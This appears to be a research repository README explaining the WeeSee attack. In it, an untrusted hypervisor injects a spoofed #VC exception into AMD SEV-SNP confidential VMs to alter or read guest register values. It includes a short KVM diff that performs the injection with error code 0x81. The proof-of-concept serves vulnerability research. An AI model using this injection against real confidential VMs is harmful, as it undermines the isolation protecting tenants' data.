# WeeSee

WeeSee is a security attack that exploits the VMM Communication exception (#VC) in Confidential VMs (CVMs). By manipulating the #VC exception handling mechanism, the untrusted hypervisor can compromise the security of CVMs despite the protection mechanisms of AMD SEV-SNP.

## How #VC Works
AMD SEV-SNP introduces the VMM Communication exception (#VC) to enable secure communication between CVMs and the hypervisor. When a CVM executes certain operations (like vmmcall), the trusted hardware raises #VC and stores operation details in the exit_reason register. The CVM's kernel handles #VC by copying necessary data to the Guest Hypervisor Communication Block (GHCB), transferring control to the hypervisor, and restoring the application context after the hypervisor completes its operations. This mechanism allows CVMs to maintain security while still enabling essential hypervisor functionality.

## Our test method

Our testing approach involves injecting interrupt 29 in the kernel while modifying its error_code to 0x81. We execute a program in the victim VM that prints the value of RAX. After injection, we verify whether RAX was modified and whether the kernel can access the RAX value from the victim VM.


## important code
```
 
+    if(atomic_read(&user_data_npf_ex.user_interrupt_pending) == 1){
+		atomic_set(&user_data_npf_ex.user_interrupt_pending, 0);
+		printk("reset user_interrupt_pending finish");
+
+
+        svm->vmcb->control.event_inj = 29 | SVM_EVTINJ_VALID | SVM_EVTINJ_VALID_ERR | SVM_EVTINJ_TYPE_EXEPT;
+
+		// VMMCALL
+       svm->vmcb->control.event_inj_err = 0x81;
+		// rdtscp
+		// svm->vmcb->control.event_inj_err = 0x81;
+        printk("before run: event_inj %x\n",svm->vmcb->control.event_inj);
+        printk("before run: event_inj_err %x\n",svm->vmcb->control.event_inj_err);
+    }